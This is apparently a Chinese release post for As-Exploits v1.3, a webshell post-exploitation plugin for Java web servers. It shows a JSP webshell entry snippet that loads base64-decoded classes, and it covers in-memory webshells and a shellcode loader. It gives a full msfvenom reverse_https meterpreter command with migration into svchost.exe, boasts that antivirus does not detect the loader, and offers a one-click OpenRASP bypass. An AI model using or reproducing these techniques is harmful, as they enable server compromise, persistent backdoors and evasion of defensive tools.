# As-Exploits v1.3更新


<meta name="referrer" content="no-referrer" />

## 更新主要内容

### v 1.3 (2021/5/14)

- equals支持数组传参方式，兼容各种容器
- jsp新增 ShellCode加载器模块，内置两种分别基于jna跟java agent的shellcode加载方式

- jsp新增 Bypass OpenRASP 模块，thx@Godzilla
- JarLoader模块 新增手动上传方式，解决因Tomcat最大POST长度为2m导致无法加载内存Jar的问题

- reGeorg内存马改为更稳定的neo-reGerog，默认密码：asexploits
- 冰蝎内存马支持3.7，去除pageContext依赖，兼容Spring等容器

- 各模块兼容JDK5

挑几个重点的说说

## Shell入口参数支持数组形式

Shell入口参数即下面new Object[]{request,response}的部分。

```
<%
    String cls = request.getParameter("ant");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]{request,response});
    }
%>
```

至于为什么要改这个玩意要从内存马的兼容说起。



除了由于写法问题而导致的各种乱七八糟的问题以外，连接内存马的一个主要问题是冰蝎在入口处采用了pageContext这个类来获取request response session对象。但是以filter型内存马为例，doFilter中三个参数分别是ServletRequest，ServletResponse，FilterChain，并不存在pageContext这个东西，并且在SpringBoot这种容器里根本没有pageContext这个类。

于是就有跟多师傅提出了自己的解决办法，大体分为三种：

1. 自己声明一个pageContext类，在里面实现对应的request跟response的getter setter。[冰蝎改造之不改动客户端=>内存马](https://mp.weixin.qq.com/s/r4cU84fASjflHrp-pE-ybg)。
2. 改写冰蝎的入口为request+response，不再采用pageContext作为入口。但是弊端就是不能再用equals了，要重新写一个方法用反射调用。[冰蝎改造之适配基于tomcat Filter的无文件webshell](https://xz.aliyun.com/t/7899)

1. 采用蚁剑原来的Custom模式，把恶意函数直接通过字节码打进去，然后通过方法名调用。不过由于直接编译恶意函数的字节码较大会超过最大长度限制，一般要先写入目标然后配合URLClassLoader才能使用。[使用WebLogic CVE-2020-2883配合Shiro rememberMe反序列化一键注入蚁剑shell](https://xz.aliyun.com/t/8202)

以上的这些方法可以是可以，但是不够优雅。



回想我们最开始的问题，为什么要用pageContext，是为了拿到当前请求的上下文，更精确一点就是输入输出：request,response。request是接收参数，response是回显，两者缺一不可。

后来自己调试的时候发现在request中本身就包含了当前的response，同样response中也包含了当前的request。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067954640-30c5d253-086e-4c5f-9664-d4f3d58279a9.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067965986-fd696384-0f1f-46be-a812-2fe851ad6c40.png)

当时就想着我shell中传个request，然后在payload里面利用反射把requst里面的response取出来，或者response里面的request取出来不就完事了？

这样确实可以，在2020年9月4日，勤劳的我一大早就起来写了一波代码，然后发了上去，[commit记录](https://github.com/AntSwordProject/AntSword-JSP-Template/commit/3408ec21a4361db6772f2680c7be06f4ebf22c10)可以证明我没有瞎bb。当时蚁剑算是最早兼容内存马的。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1621069223851-7c428578-4014-4856-9656-12ff9c824889.png)

因为Tomcat喜欢用门面模式，所以要反射两层，结果后来发现在WebLogic下用不了了，因为WebLogic不喜欢搞门面模式，只需要反射一层就够了。



行吧，那我就再加一种情况，在JSP [V1.4版本](https://github.com/AntSwordProject/AntSword-JSP-Template/commit/ed2489f54729b30701d4894cbf01d0e7a70bb60b)又增加了一层反射的情况。



本来以为没事了，后来又发现在有shiro的情况下打一个servlet内存马进去，这时候去连接内存马需要反射三次？？

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1616503206581-8e5bc7f0-f93f-47df-84b1-3e80206cea7a.png)

WTF？？？

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1616503331361-d40d72f7-ed5f-4521-a1ac-c5dd2b2df52d.png)

然后意识到，这种case by case的解决方式是不行的，世界上还有那么多种Web容器中间件，不可能一个一个去调吧。

所以为了彻底解决这个问题，在520师傅的建议下采用了数组的方式将两者直接传进去，把分析的逻辑放在打内存Shell的时候去做，而不在payload里面去做。



现在冰蝎跟哥斯拉也都有了相应的机制，思路大体是一样的，感兴趣的小伙伴可以自己研究一下。

## JarLoader模块新增手动上传方式

#### 内存加载

直接通过HTTP包将Jar打入目标内存，仅需选择本地需要上传的Jar文件即可，期间文件不落地。但是Tomcat默认POST最大上传大小为2M，如果超过了此大小请选择手动上传模式。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067344909-cade8e67-8027-4771-8933-aeba53004124.png)

#### 手动上传

先手动将Jar上传到目标服务器上，然后通过路径加载。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067350373-df952d78-4c46-4edd-8095-9a14aabfdb99.png)

## JSP ShellCode加载器

内置两种加载方式，使用之前请务必认真阅读使用说明，否则可能直接将Java进程打挂。



需要注意两点：

- 使用MSF需要加上`PrependMigrate=true PrependMigrateProc=xxxx.exe`参数，自动迁移到新的进程，否则会在migrate/exit的时候把Java进程给干掉，导致网站瘫痪。例如：`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.88.129 LPORT=8888  PrependMigrate=true PrependMigrateProc=svchost.exe -f hex`
- JNA方式只需要X86类型的ShellCode即可，而Attach方式需要根据目标Java位数来选择对应的ShellCode。

### JNA方式

利用第三方库JNA进行ShellCode的加载。

适用范围：JDK>=1.5

#### 正确操作

1. 首先利用Jar加载器将`ShellCodeLoader.jar`上传到目标服务器目录并加载。
2. 使用MSF或者CS生成x86类型的shellcode，并开启监听。

1. 在ShellCode加载器模块，输入hex或者java格式的shellcode，且不能有多余换行跟空格。
2. 点击exploit，等待返回回话。

#### JNA方式测试

装了360，火绒，电脑管家

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1620703761091-757ec1a0-dc22-42a8-8264-90186857e093.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1620703768557-ead0e8b9-01af-40c1-829f-859f05e3f381.png)

上传插件ext目录下的ShellcodeLoader.jar到目标服务器，然后复制文件路径

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067128068-3e3004d7-9cf1-4997-b352-c06e2cbd8d1b.png)

手动加载到JVM中

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067132501-eb56f724-4191-4014-b940-acc602519116.png)

MSF生成Shellcode

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067117069-28df9a49-30b4-4178-9228-51a948f0e854.png)

选择JNA方式，exploit!

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067139961-3e021c58-560c-4283-b7d9-5379fffb27ed.png)

直接上线，杀软没有拦截

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067110644-490c6992-1f0e-4228-9124-1dd5dfd634d2.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067151696-a2c1fe78-b091-481f-b3d0-48fbd70893fe.png)



关于jna会生成一个临时文件的问题，发现确实会生成一个dll临时文件在Tomcat临时目录下

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1620911946718-2055dd24-54a9-4584-b8b7-53872a35f46a.png)

但是扫了一下发现是免杀的

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1620912026110-a394dfa1-5fe1-46fb-923b-6aec2e55a037.png)

VT检测结果0/68，也就是说落地也问题不大。

不过可能这篇文章出来之后就没了

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1620912118643-c07e2e88-fb6f-415f-ac0e-952724f77c18.png)



### Attach

模拟java agent注入过程来实现Shellcode的加载。这个native方法是jdk自带的，并且经过oracle签名的，理论上免杀效果更好。

适用范围：JDK>=1.6

#### 正确操作

1. 基本信息，exploit，Ctrl+F 搜索 `sun.arch.data.model`，查看java位数
2. 根据java位数生成对应位数的shellcode，并开启监听。

1. 在ShellCode加载器模块，输入hex或者java格式的shellcode，且不能有多余换行跟空格。
2. 点击exploit，等待返回回话。

#### Attach方式测试

发现是64位java

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067200409-961948c8-5bf7-456e-95f5-fc83fdd14654.png)

CS生成对应位数的shellcode，选择java格式导出。

粘贴到插件中，在exploit的一刻会自动格式化为hex

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1620703807468-151e070f-b07a-4abf-8ff2-dbad3d0a3a3d.png)

直接上线，杀软没有拦截。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1620703830068-f753a8b6-57c0-4990-bc83-cd24fb7b3d75.png)

## 一键Bypass OpenRASP

借鉴自哥斯拉的插件：[Godzilla-BypassOpenRasp](https://github.com/BeichenDream/Godzilla-Plugin-Store/blob/master/Godzilla-BypassOpenRasp.jar)

一键绕过OpenRASP

目标安装有OpenRASP且开启命令执行拦截

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067294376-d189243e-dd63-4feb-a291-7b384cd55aeb.png)

exploit!

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067289062-8d172156-075b-4f43-a06a-8b30fd7f0bef.png)

再次运行，即可执行命令

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067283390-eeef6d4e-f632-40d0-ad5a-fbb717044e06.png)

## 其他

- reGeorg内存马改为更稳定的neo-reGerog，默认密码：asexploits
- 冰蝎内存马去除pageContext依赖，兼容Spring等容器

- 各模块兼容JDK5



## 项目地址

https://github.com/yzddmr6/As-Exploits

来颗star吧~
